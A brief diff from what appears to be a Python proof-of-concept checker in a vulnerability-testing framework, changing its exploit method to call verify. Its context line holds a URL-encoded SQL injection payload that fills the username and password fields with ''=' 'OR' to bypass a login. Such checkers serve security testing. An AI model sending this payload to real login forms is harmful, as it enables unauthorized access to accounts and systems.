@@ -61,7 +61,7 @@ A_USERNAME=%27%3D%27+%27OR%27&A_PASSWORD=%27%3D%27+%27OR%27
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
